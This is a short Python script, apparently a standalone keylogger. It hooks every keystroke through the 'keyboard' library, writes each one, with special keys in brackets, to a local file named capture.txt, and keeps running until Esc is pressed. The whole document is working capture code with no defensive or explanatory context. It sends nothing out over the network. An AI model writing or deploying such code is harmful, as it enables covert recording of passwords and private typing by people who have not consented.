import keyboard

def capture_keypress(event):
    log_file = "capture.txt"
    with open(log_file, "a", encoding="utf-8") as f:
        if event.name == "space":
            f.write(" ")
        elif event.name == "enter":
            f.write("\n")
        elif event.name == "backspace":
            f.write("[BACKSPACE]")
        elif len(event.name) > 1:
            f.write(f"[{event.name.upper()}]")
        else:
            f.write(event.name)

keyboard.hook(capture_keypress,suppress=True)

keyboard.wait('esc')